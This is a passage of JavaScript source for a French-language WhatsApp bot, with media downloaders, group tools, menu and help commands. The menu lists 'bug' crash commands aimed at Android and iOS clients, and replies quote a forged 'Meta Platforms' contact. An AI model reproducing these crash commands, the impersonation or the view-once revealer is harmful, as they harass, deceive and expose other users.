    const response = await axios.post('https://v3.fdownloader.net/api/ajaxSearch',
      new URLSearchParams({
        q: url,
        lang: 'en',
        web: 'fdownloader.net',
        v: 'v2',
        w: ''
      }).toString(),
      {
        headers: {
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          origin: 'https://fdownloader.net',
          referer: 'https://fdownloader.net/',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
        }
      }
    );

    // Vérifier la réponse
    if (!response.data || !response.data.data) {
      throw new Error('Impossible de récupérer les informations de la vidéo');
    }

    // Parser le HTML avec cheerio
    const $ = cheerio.load(response.data.data);
    
    // Extraire la durée
    const duration = $('.content p').first().text().trim() || 'Inconnue';
    
    // Extraire la miniature
    const thumbnail = $('.thumbnail img').attr('src') || null;
    
    // Extraire toutes les qualités disponibles
    const videos = [];
    $('.download-link-fb').each((_, el) => {
      const quality = $(el).attr('title')?.replace('Download ', '') || '';
      const videoUrl = $(el).attr('href');
      if (videoUrl) {
        videos.push({ quality, url: videoUrl });
      }
    });

    // Extraire aussi les liens normaux (parfois dans .download-button)
    $('.download-button a').each((_, el) => {
      const quality = $(el).text().trim() || 'SD';
      const videoUrl = $(el).attr('href');
      if (videoUrl && !videos.some(v => v.url === videoUrl)) {
        videos.push({ quality, url: videoUrl });
      }
    });

    if (videos.length === 0) {
      throw new Error('Aucune vidéo trouvée pour ce lien');
    }

    // Sélectionner la meilleure qualité disponible (priorité: HD > 720p > 480p > première)
    const qualityPriority = ['HD', '720p', '480p', '360p'];
    let selectedVideo = videos[0];
    
    for (const priority of qualityPriority) {
      const found = videos.find(v => 
        v.quality.toLowerCase().includes(priority.toLowerCase())
      );
      if (found) {
        selectedVideo = found;
        break;
      }
    }

    // Message d'information
    const infoMessage = `📹 *Facebook Downloader*\n\n` +
      `📊 *Qualité:* ${selectedVideo.quality}\n` +
      `⏱️ *Durée:* ${duration}\n` +
      `📦 *Taille:* (non disponible)\n\n` +
      `🔗 *Lien:* ${url}\n\n` +
      `📥 *Envoi de la vidéo en cours...*`;

    await socket.sendMessage(sender, { text: infoMessage }, { quoted: msg });

    try {
      // Essayer d'envoyer la vidéo directement
      await socket.sendMessage(jid, {
        video: { url: selectedVideo.url },
        caption: `📹 *Facebook Video*\n📊 Qualité: ${selectedVideo.quality}\n⏱️ Durée: ${duration}`,
        mimetype: 'video/mp4'
      }, { quoted: msg });
      
    } catch (sendErr) {
      console.error('[FACEBOOK SEND ERROR]', sendErr);
      
      // Si l'envoi direct échoue, envoyer le lien
      await socket.sendMessage(sender, {
        text: `❌ Impossible d'envoyer la vidéo directement.\n\n🔗 *Lien de téléchargement:*\n${selectedVideo.url}\n\n📊 *Qualité:* ${selectedVideo.quality}`
      }, { quoted: msg });
    }

    // Réaction de succès
    await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });

  } catch (e) {
    console.error('[FACEBOOK ERROR]', e);
    
    // Définir jid et sender pour le bloc catch aussi
    const jid = remoteJid || msg.key.remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;
    
    let errorMessage = e.message;
    if (e.response) {
      errorMessage += ` (Status: ${e.response.status})`;
    }
    
    await socket.sendMessage(sender, {
      text: `❌ Erreur: ${errorMessage}\n\nEssayez un autre lien ou réessayez plus tard.`
    }, { quoted: msg });
    
    await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
  }
  break;
}
// case 'ig' : télécharger depuis reelsvideo.io et renvoyer média(s)
case 'ig': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
    // permission : seul le propriétaire de la session ou le bot owner peut utiliser
    if (senderNum !== sanitized && senderNum !== ownerNum) {
      return await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or bot owner can use this command.' }, { quoted: msg });
    }

    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      return await socket.sendMessage(sender, { text: '❗ Usage: .ig <instagram_url>\nExample: .ig https://www.instagram.com/p/XXXXXXXXX/' }, { quoted: msg });
    }

    await socket.sendMessage(sender, { text: '🔎 Recherche et téléchargement en cours, merci de patienter...' }, { quoted: msg });

    // appelle la fonction reelsvideo (assure-toi qu'elle est importée dans le fichier)
    const info = await reelsvideo(url);

    if (!info) {
      return await socket.sendMessage(sender, { text: '❌ Impossible de récupérer les informations pour ce lien.' }, { quoted: msg });
    }

    // Préparer un résumé et l'envoyer d'abord
    const summaryLines = [
      `👤 Auteur: ${info.username || 'inconnu'}`,
      `📸 Type: ${info.type || 'inconnu'}`,
      `🖼️ Images: ${info.images?.length || 0}`,
      `🎞️ Vidéos: ${info.videos?.length || 0}`,
      `🎵 Audio: ${info.mp3?.length || 0}`
    ];
    if (info.thumb) summaryLines.unshift(`🔎 Aperçu: ${info.thumb}`);
    await socket.sendMessage(sender, { text: `✅ Résultat:\n${summaryLines.join('\n')}` }, { quoted: msg });

    // helper pour télécharger une URL en Buffer
    async function fetchBufferFromUrl(u) {
      try {
        const r = await axios.get(u, { responseType: 'arraybuffer', timeout: 30_000 });
        return Buffer.from(r.data);
      } catch (e) {
        console.error('[IG] fetchBufferFromUrl error', e?.message || e);
        return null;
      }
    }

    // envoyer les vidéos (priorité aux vidéos)
    if (Array.isArray(info.videos) && info.videos.length) {
      // si plusieurs vidéos, on envoie jusqu'à 3 pour éviter flood
      const toSend = info.videos.slice(0, 3);
      for (const v of toSend) {
        try {
          const buf = await fetchBufferFromUrl(v);
          if (!buf) {
            await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger la vidéo: ${v}` }, { quoted: msg });
            continue;
          }
          await socket.sendMessage(sender, {
            video: buf,
            caption: ` Doberto XD -- 🎥 Vidéo extraite de ${info.username || 'Instagram'}`,
            mimetype: 'video/mp4'
          }, { quoted: msg });
        } catch (e) {
          console.error('[IG] send video error', e);
        }
      }
      return;
    }

    // sinon envoyer les images (carousel ou single)
    if (Array.isArray(info.images) && info.images.length) {
      const toSend = info.images.slice(0, 6); // limite raisonnable
      for (const imgUrl of toSend) {
        try {
          const buf = await fetchBufferFromUrl(imgUrl);
          if (!buf) {
            await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'image: ${imgUrl}` }, { quoted: msg });
            continue;
          }
          await socket.sendMessage(sender, {
            image: buf,
            caption: `🖼️ Image extraite de ${info.username || 'Instagram'}`
          }, { quoted: msg });
        } catch (e) {
          console.error('[IG] send image error', e);
        }
      }
      return;
    }

    // si audio disponible (mp3)
    if (Array.isArray(info.mp3) && info.mp3.length) {
      for (const a of info.mp3.slice(0, 2)) {
        try {
          const buf = await fetchBufferFromUrl(a.url);
          if (!buf) {
            await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'audio: ${a.url}` }, { quoted: msg });
            continue;
          }
          await socket.sendMessage(sender, {
            audio: buf,
            mimetype: 'audio/mpeg',
            fileName: `${a.id || 'audio'}.mp3`
          }, { quoted: msg });
        } catch (e) {
          console.error('[IG] send audio error', e);
        }
      }
      return;
    }

    // fallback : si aucune ressource trouvée
    await socket.sendMessage(sender, { text: '❌ Aucun média exploitable trouvé pour ce lien.' }, { quoted: msg });

  } catch (err) {
    console.error('[IG COMMAND ERROR]', err);
    try { await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } }); } catch(e){}
    await socket.sendMessage(sender, { text: `❌ Erreur lors du traitement: ${err.message || err}` }, { quoted: msg });
  }
  break;
}


case 'menu': {
  try {
    await socket.sendMessage(sender, { react: { text: "🐉", key: msg.key } });
  } catch (e) {}

  try {
    const userJid    = msg?.key?.participant ?? msg?.key?.remoteJid ?? sender;
    const userNumber = (typeof userJid === 'string') ? userJid.split('@')[0] : null;
    const userShort  = userNumber ?? 'user';

    const keyNumber  = userNumber;
    const keyJid     = userNumber ? `${userNumber}@s.whatsapp.net` : null;

    let startTime = undefined;
    if (typeof socketCreationTime !== 'undefined' && socketCreationTime instanceof Map) {
      startTime = socketCreationTime.get(keyNumber) ?? socketCreationTime.get(keyJid);
    }
    if (!startTime) startTime = Date.now();

    const uptimeRaw = process.uptime();
    const uptimeH   = Math.floor(uptimeRaw / 3600);
    const uptimeM   = Math.floor((uptimeRaw % 3600) / 60);
    const uptimeS   = Math.floor(uptimeRaw % 60);
    const uptimeStr = `${uptimeH}h ${uptimeM}m ${uptimeS}s`;

    const botName    = (typeof config !== 'undefined' && config?.BOT_NAME) ? config.BOT_NAME : 'DOBERTO-XD MD';
    const footer     = (typeof config !== 'undefined' && config?.BOT_FOOTER) ? config.BOT_FOOTER : '© 2024';
    const ownerName  = (typeof config !== 'undefined' && config?.OWNER_NAME) ? config.OWNER_NAME : 'DOBERTO';
    const activeCount = (typeof activeSockets !== 'undefined' && activeSockets?.size != null) ? activeSockets.size : 0;
    const memMB      = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    const totalMemMB = (require('os').totalmem() / 1024 / 1024).toFixed(0);
    const cmdCount   = 120;

    const metaQuote = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_PING"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
        }
      }
    };

    const text = [
      `*╭───────────◇*`,
      `│ ✧ ʙᴏᴛ ɴᴀᴍᴇ: DOBERTO-XD MD`,
      `│ ✧ ᴜsᴇʀ: @${userShort}`,
      `│ ✧ ᴀᴄᴛɪᴠᴇ ᴜsᴇʀs: ${activeCount}`,
      `│ ✧ ᴜᴘᴛɪᴍᴇ: ${uptimeStr}`,
      `│ ✧ ᴍᴇᴍᴏʀʏ: ${memMB}ᴍʙ / ${totalMemMB}ᴍʙ`,
      `│ ✧ ᴄᴏᴍᴍᴀɴᴅs: 63`,
      `│ ✧ ᴅᴇᴠ: DOBERTO`,
      `*╰───────────◇*`,
      ``,
      `╭───『 ᴅᴏʙᴇʀᴛᴏ ɢᴇɴᴇʀᴀʟ 』`,
      `│ ▢ alive`,
      `│ ▢ menu`,
      `│ ▢ ping`,
      `│ ▢ aide / help`,
      `│ ▢ owner`,
      `╰────────────────────◇`,
      ``,
      `╭───『 ᴅᴏʙᴇʀᴛᴏ ɢʀᴏᴜᴘᴇ 』`,
      `│ ▢ kick`,
      `│ ▢ add`,
      `│ ▢ leave`,
      `│ ▢ tagall`,
      `│ ▢ hidetag / h`,
      `│ ▢ mute`,
      `│ ▢ unmute`,
      `│ ▢ swgc`,
      `│ ▢ setgpp`,
      `│ ▢ listadmin`,
      `│ ▢ creategroup`,
      `│ ▢ acceptall`,
      `│ ▢ revokeall`,
      `│ ▢ listactive`,
      `│ ▢ listinactive`,
      `│ ▢ kickinactive`,
      `│ ▢ kickall`,
      `│ ▢ antilink`,
      `│ ▢ antistatusmention`,
      `│ ▢ antibot on/off 🔇`,
      `╰────────────────────◇`,
      ``,
      `╭───『 ᴅᴏʙᴇʀᴛᴏ ᴏᴜᴛɪʟs 』`,
      `│ ▢ sticker`,
      `│ ▢ take`,
      `│ ▢ trt`,
      `│ ▢ tovn`,
      `│ ▢ save`,
      `│ ▢ vv`,
      `│ ▢ bible`,
      `│ ▢ upch`,
      `│ ▢ img`,
      `│ ▢ jid`,
      `│ ▢ cjid`,
      `│ ▢ code`,
      `│ ▢ getpp`,
      `│ ▢ setpp`,
      `│ ▢ ssweb`,
      `│ ▢ checkban`,
      `│ ▢ shazam`,
      `│ ▢ mediafire`,
      `│ ▢ bug android/ios/blank 💥`,
      `│ ▢ bug invite/channel/all 💥`,
      `╰────────────────────◇`,
      ``,
      `╭───『 ᴅᴏʙᴇʀᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ 』`,
      `│ ▢ play`,
      `│ ▢ playvideo`,
      `│ ▢ playptt`,
      `│ ▢ tiktok`,
      `│ ▢ facebook`,
      `│ ▢ ig`,
      `│ ▢ modapk`,
      `╰────────────────────◇`,
      ``,
      `╭───『 ᴅᴏʙᴇʀᴛᴏ ᴘᴀʀᴀᴍs 』`,
      `│ ▢ config show`,
      `│ ▢ config autoview`,
      `│ ▢ config autolike`,
      `│ ▢ config autorec`,
      `│ ▢ config setemoji`,
      `│ ▢ config setprefix`,
      `│ ▢ prefix (./*/!/?/+)`,
      `│ ▢ private 🔒`,
      `│ ▢ public 🔓`,
      `╰────────────────────◇`,
      ``,
      `> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`
    ].join('\n');

    // Envoi du menu sans boutons, avec mention réelle, forwarded look et externalAdReply (newsletter)
    await socket.sendMessage(sender, {
      image: { url: 'https://i.ibb.co/k2bvvh72/IMG-20260515-WA0026.jpg' },
      caption: text,
      contextInfo: {
        mentionedJid: [userJid],
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363407485857714@newsletter',
          newsletterName: config.BOT_NAME,
          serverMessageId: 143
        }
      }
    }, { quoted: metaQuote });

  } catch (err) {
    console.error('menu error:', err);
    try {
      await socket.sendMessage(sender, {
        text:
          '📋 *MENU SIMPLE*\n\n' +
          `.add, .kick, .creategroup\n` +
          `.save, .tovn, .vv\n` +
          `.play, .bible, .code\n` +
          `.upch, .swgc, .img\n` +
          `\nUtilise .help [commande] pour plus d'info`
      }, { quoted: msg });
    } catch (e) {}
  }
  break;
}


// ================= CASE DANS TON BOT =================
case 'swgc': {
  try {
    const crypto = require('crypto');
    const { generateWAMessageContent, generateWAMessageFromContent, downloadContentFromMessage } = require('@rexxhayanasi/elaina-baileys');

    async function groupStatus(client, jid, content) {
      const inside = await generateWAMessageContent(content, {
        upload: client.waUploadToServer
      });
      const messageSecret = crypto.randomBytes(32);
      const m = generateWAMessageFromContent(
        jid,
        {
          messageContextInfo: { messageSecret },
          groupStatusMessageV2: {
            message: { ...inside, messageContextInfo: { messageSecret } }
          }
        },
        {}
      );
      await client.relayMessage(jid, m.message, { messageId: m.key.id });
    }

    function randomColor() {
      return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
    }

    // Définir les variables nécessaires
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    const textInput = args.join(' ').trim();
    const jid = msg.key.remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;
    const isGroup = jid.endsWith('@g.us');
    const prefix = config.PREFIX || '.';
    
    // IMPORTANT: On ne répond que dans le groupe ou en privé selon le contexte
    // Si c'est un groupe, on répond dans le groupe
    // Si c'est un message privé, on répond en privé
    const replyJid = isGroup ? jid : sender;

    // Vérifier si on est dans un groupe
    if (!isGroup) {
      await socket.sendMessage(sender, { 
        text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗚𝗥𝗢𝗨𝗣𝗘 』* ❏─╮\n` +
              `│ ✦ *Erreur* ❌\n` +
              `│ ✦ Cette commande ne peut être utilisée\n` +
              `│ ✦ que dans un groupe !\n` +
              `╰─────────────────╯\n` +
              `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`
      }, { quoted: msg });
      break;
    }

    // Réaction d'attente dans le groupe
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });

    // Si c'est une réponse à un message
    if (msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      const quotedMessage = msg.message.extendedTextMessage.contextInfo.quotedMessage;
      
      // Récupérer la caption originale du média cité
      let originalCaption = "";
      
      if (quotedMessage.videoMessage && quotedMessage.videoMessage.caption) {
        originalCaption = quotedMessage.videoMessage.caption;
      } else if (quotedMessage.imageMessage && quotedMessage.imageMessage.caption) {
        originalCaption = quotedMessage.imageMessage.caption;
      }
      
      // Construire la nouvelle caption avec le watermark stylisé
      let finalCaption = "";
      const watermark = `\n\n━━━━━━━━━━━━━━\n✨ *𝗽𝗼𝘀𝘁𝗲𝗱 𝗯𝘆* ✨\n🇺🇲 *𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃* 🇺🇸`;
      
      if (originalCaption && textInput) {
        finalCaption = `📝 *𝗖𝗮𝗽𝘁𝗶𝗼𝗻 𝗼𝗿𝗶𝗴𝗶𝗻𝗮𝗹𝗲* 📝\n❝ ${originalCaption} ❞\n\n💬 *𝗧𝗲𝘅𝘁𝗲 𝗮𝗷𝗼𝘂𝘁é* 💬\n❝ ${textInput} ❞${watermark}`;
      } else if (originalCaption) {
        finalCaption = `📝 *𝗖𝗮𝗽𝘁𝗶𝗼𝗻* 📝\n❝ ${originalCaption} ❞${watermark}`;
      } else if (textInput) {
        finalCaption = `💬 *𝗧𝗲𝘅𝘁𝗲* 💬\n❝ ${textInput} ❞${watermark}`;
      } else {
        finalCaption = `✨ *𝗦𝘁𝗮𝘁𝘂𝘁 𝗱𝗲 𝗴𝗿𝗼𝘂𝗽𝗲* ✨${watermark}`;
      }
      
      // Traitement vidéo
      if (quotedMessage.videoMessage) {
        const videoMsg = quotedMessage.videoMessage;
        
        const stream = await downloadContentFromMessage(videoMsg, 'video');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          video: buffer,
          caption: finalCaption,
          mimetype: videoMsg.mimetype || 'video/mp4',
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        
        // Confirmation dans le groupe UNIQUEMENT
        await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
        await socket.sendMessage(jid, { 
          text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗩𝗜𝗗𝗘𝗢 』* ❏─╮\n` +
                `│ ✦ *𝗣𝘂𝗯𝗹𝗶é 𝗮𝘃𝗲𝗰 𝘀𝘂𝗰𝗰è𝘀* ✅\n` +
                `│ ✦ 𝙿𝚊𝚛 : @${sender.split('@')[0]}\n` +
                `╰─────────────────╯\n` +
                `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`,
          mentions: [sender]
        });
      }
      // Traitement image
      else if (quotedMessage.imageMessage) {
        const imgMsg = quotedMessage.imageMessage;
        const stream = await downloadContentFromMessage(imgMsg, 'image');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          image: buffer,
          caption: finalCaption,
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        
        await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
        await socket.sendMessage(jid, { 
          text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗜𝗠𝗔𝗚𝗘 』* ❏─╮\n` +
                `│ ✦ *𝗣𝘂𝗯𝗹𝗶é 𝗮𝘃𝗲𝗰 𝘀𝘂𝗰𝗰è𝘀* ✅\n` +
                `│ ✦ 𝙿𝚊𝚛 : @${sender.split('@')[0]}\n` +
                `╰─────────────────╯\n` +
                `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`,
          mentions: [sender]
        });
      }
      // Traitement audio
      else if (quotedMessage.audioMessage) {
        const audioMsg = quotedMessage.audioMessage;
        const stream = await downloadContentFromMessage(audioMsg, 'audio');
        const chunks = [];
        for await (const chunk of stream) {
          chunks.push(chunk);
        }
        const buffer = Buffer.concat(chunks);
        
        const payload = {
          audio: buffer,
          mimetype: audioMsg.mimetype || 'audio/mp4',
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        
        // Envoyer le texte séparément si présent
        if (finalCaption) {
          await socket.sendMessage(jid, {
            text: finalCaption
          });
        }
        
        await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
        await socket.sendMessage(jid, { 
          text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 』* ❏─╮\n` +
                `│ ✦ *𝗣𝘂𝗯𝗹𝗶é 𝗮𝘃𝗲𝗰 𝘀𝘂𝗰𝗰è𝘀* ✅\n` +
                `│ ✦ 𝙿𝚊𝚛 : @${sender.split('@')[0]}\n` +
                `╰─────────────────╯\n` +
                `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`,
          mentions: [sender]
        });
      }
      // Message texte cité
      else {
        let quotedText = "";
        if (quotedMessage.conversation) {
          quotedText = quotedMessage.conversation;
        } else if (quotedMessage.extendedTextMessage?.text) {
          quotedText = quotedMessage.extendedTextMessage.text;
        }
        
        const textToUse = textInput || quotedText;
        
        if (!textToUse) {
          throw new Error("Aucun texte à publier");
        }
        
        const finalText = `❝ ${textToUse} ❞${watermark}`;
        
        const payload = {
          text: finalText,
          backgroundColor: randomColor()
        };
        
        await groupStatus(socket, jid, payload);
        
        await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
        await socket.sendMessage(jid, { 
          text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗧𝗘𝗫𝗧𝗘 』* ❏─╮\n` +
                `│ ✦ *𝗣𝘂𝗯𝗹𝗶é 𝗮𝘃𝗲𝗰 𝘀𝘂𝗰𝗰è𝘀* ✅\n` +
                `│ ✦ 𝙿𝚊𝚛 : @${sender.split('@')[0]}\n` +
                `╰─────────────────╯\n` +
                `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`,
          mentions: [sender]
        });
      }
    } 
    else if (textInput) {
      // Message texte simple sans citation
      const watermark = `\n\n━━━━━━━━━━━━━━\n✨ *𝗽𝗼𝘀𝘁𝗲𝗱 𝗯𝘆* ✨\n⚡ *𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃* 🇺🇸`;
      const finalText = `💬 *𝗠𝗲𝘀𝘀𝗮𝗴𝗲* 💬\n❝ ${textInput} ❞${watermark}`;
      
      const payload = {
        text: finalText,
        backgroundColor: randomColor()
      };
      
      await groupStatus(socket, jid, payload);
      
      await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
      await socket.sendMessage(jid, { 
        text: `╭─❏ *『 𝗦𝗧𝗔𝗧𝗨𝗧 𝗧𝗘𝗫𝗧𝗘 』* ❏─╮\n` +
              `│ ✦ *𝗣𝘂𝗯𝗹𝗶é 𝗮𝘃𝗲𝗰 𝘀𝘂𝗰𝗰è𝘀* ✅\n` +
              `│ ✦ 𝙿𝚊𝚛 : @${sender.split('@')[0]}\n` +
              `╰─────────────────╯\n` +
              `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`,
        mentions: [sender]
      });
    }
    else {
      await socket.sendMessage(jid, { 
        text: `╭─❏ *『 𝗘𝗥𝗥𝗘𝗨𝗥 』* ❏─╮\n` +
              `│ ✦ *𝗨𝘀𝗮𝗴𝗲 𝗶𝗻𝗰𝗼𝗿𝗿𝗲𝗰𝘁* ❌\n` +
              `│ ✦ 𝙴𝚡𝚎𝚖𝚙𝚕𝚎 : ${prefix}${command} 𝚂𝚊𝚕𝚞𝚝\n` +
              `│ ✦ 𝙾𝚞 𝚛é𝚙𝚘𝚗𝚍 𝚊̀ 𝚞𝚗 𝚖é𝚍𝚒𝚊\n` +
              `╰─────────────────╯\n` +
              `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`
      }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    }

  } catch (e) {
    console.error('[SWGC ERROR]:', e);
    const jid = msg?.key?.remoteJid;
    const sender = msg?.key?.participant || msg?.key?.remoteJid;
    const isGroup = jid?.endsWith('@g.us');
    const replyJid = isGroup ? jid : sender;
    
    await socket.sendMessage(replyJid, { react: { text: "❌", key: msg.key } });
    await socket.sendMessage(replyJid, { 
      text: `╭─❏ *『 𝗘𝗥𝗥𝗘𝗨𝗥 』* ❏─╮\n` +
            `│ ✦ *𝗨𝗻𝗲 𝗲𝗿𝗿𝗲𝘂𝗿 𝗲𝘀𝘁 𝘀𝘂𝗿𝘃𝗲𝗻𝘂𝗲* ❌\n` +
            `│ ✦ 𝙳é𝚝𝚊𝚒𝚕 : ${e.message}\n` +
            `╰─────────────────╯\n` +
            `> © 𝐃𝐨𝐛𝐞𝐫𝐭𝐨-𝐗𝐃 🇺🇸`
    });
  }
  break;
}
// ==================== DOWNLOAD MENU ====================


// ==================== TOOLS MENU ====================



// ==================== OWNER MENU ====================
// CASE AIDE / HELP
case 'help': {
  if (!from) break;

  // quoted meta (contact) utilisé comme quoted pour le design
  const metaQuote = {
    key: {
      remoteJid: "status@broadcast",
      participant: "0@s.whatsapp.net",
      fromMe: false,
         id: "META_AI_PING"
    },
    message: {
      contactMessage: {
        displayName: botName || 'Doberto XD',
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName || 'Doberto XD'};;;;\nFN:${botName || 'Doberto XD'}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
      }
    }
  };

  // URL vidéo à afficher dans l'aperçu (remplace par ta vidéo)
  const videoUrl = 'https://www.example.com/preview-video.mp4';

  // Texte d'aide détaillé (utile et concis)
  const helpText = `
⛩️  DOBERTO XD  ⛩️
───────────────

〢  𝐌𝐄𝐍𝐔 𝐏𝐑𝐈𝐍𝐂𝐈𝐏𝐀𝐋 ✿︎
・ .menu       → Affiche le menu principal.
・ .ping       → Vérifie si le bot répond et affiche l'uptime.
・ .aide/.help → Ce message d'aide détaillé.
・ .owner      → Contacte le propriétaire du bot.

〢  𝐆𝐑𝐎𝐔𝐏𝐄 ᯽
・ .kick @membre         → Expulse le membre mentionné (admins seulement).
・ .add <num>            → Ajoute un numéro au groupe (admins seulement).
・ .leave                → Le bot quitte le groupe (admin only).
・ .tagall               → Mentionne tous les membres du groupe.
・ .mute                 → Restreint l'envoi aux admins (admins).
・ .unmute               → Réactive l'envoi pour tous.
・ .swgc                 → Publie un status de groupe (reply média ou texte).
・ .listadmin            → Liste les admins du groupe.
・ .creategroup          → Crée un nouveau groupe via le bot.
・ .listactive           → Liste les membres actifs.
・ .listinactive         → Liste les membres inactifs.
・ .kickinactive         → Expulse les membres inactifs (admins only).
・ .kickall              → Expulse tous les non-admins (admins only).
・ .antilink on|off      → Supprime automatiquement les messages contenant des liens.
・ .antistatusmention on|off → Supprime les mentions de status dans le groupe.

〢  𝐎𝐔𝐓𝐈𝐋𝐒 ☀︎︎
・ .sticker   → Convertit une image/vidéo en sticker.
・ .trt       → Traduction.
・ .tovn      → Convertit audio en note vocale.
・ .save      → Sauvegarde un média(statut , vue unique etc..).
・ .vv        → révélateur de vue unique.
・ .bible     → Verset aléatoire / recherche biblique.
・ .upch      → envoyer un media vers une chaîne.
・ .img       → Recherche d'image.
・ .jid       → Récupère le JID d'un utilisateur.
・ .cjid      → Récupère le JID d'une chaîne citée.
・ .rch Ⓟ︎    → fake réaction de chaine(requiert accès premium).
・ .code      → connecter un nouvel appareil au bot.
・ .getpp     → Récupère la photo de profil d'un utilisateur.

〢  𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 ✿︎
・ .play Ⓛ︎       → Télécharge l'audio d'une vidéo YouTube.
・ .playvideo Ⓛ︎  → Télécharge la vidéo YouTube.
・ .playptt Ⓛ︎    → Télécharge en note vocale.
・ .tiktok         → Télécharge une vidéo TikTok.
・ .facebook       → Télécharge depuis Facebook.
・ .ig             → Télécharge depuis Instagram.

━━━━━━━━━━━━━━━━
ℹ️  Pour chaque commande, utilise .help <commande> pour plus de détails.
━━━━━━━━━━━━━━━━
`.trim();

  try {
    // Envoi du message d'aide avec preview vidéo via externalAdReply
    await socket.sendMessage(from, {
      text: helpText,
      contextInfo: {
        mentionedJid: [], // tu peux ajouter des mentions si nécessaire
        externalAdReply: {
          title: `${botName || 'Doberto XD'} — Aide`,
          body: 'Guide rapide des commandes et utilitaires',
          mediaUrl: videoUrl,
          thumbnailUrl: '', // remplace par ton thumbnail
          sourceUrl: videoUrl,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: metaQuote });
  } catch (err) {
    console.error('[ERROR help case]', err);
    // Fallback simple si l'envoi riche échoue
    await socket.sendMessage(from, { text: helpText }, { quoted: metaQuote });
  }
  break;
}


case 'owner': {
  try { await socket.sendMessage(sender, { react: { text: "👑", key: msg.key } }); } catch(e){}

  try {
    // Informations du propriétaire
    const ownerNumber = process.env.OWNER_NUMBER || '50935878442'; // sans +
    const ownerDisplay = 'DOBERTO MR LIT';

    // Construire la vCard
    const vcard = `BEGIN:VCARD
VERSION:3.0
N:${ownerDisplay};;;;
FN:${ownerDisplay}
ORG:Créateur
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

    // Objet "quoted" pour afficher la carte de contact en aperçu
    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_OWNER"
      },
      message: {
        contactMessage: {
          displayName: ownerDisplay,
          vcard
        }
      }
    };

    // Texte avec le même design que .alive / .ping / .menu
    const text = [
      `*╭───────────◇*`,
      `│ ✧ ɴᴀᴍᴇ: ${ownerDisplay}`,
      `│ ✧ ᴄᴏɴᴛᴀᴄᴛ: +${ownerNumber}`,
      `│ ✧ ʀôʟᴇ: ᴄʀéᴀᴛᴇᴜʀ`,
      `│ ✧ ᴅᴇᴠ: DOBERTO`,
      `*╰───────────◇*`,
      ``,
      `✨ Le génie derrière ce bot — créatif, passionné et toujours prêt à aider.`,
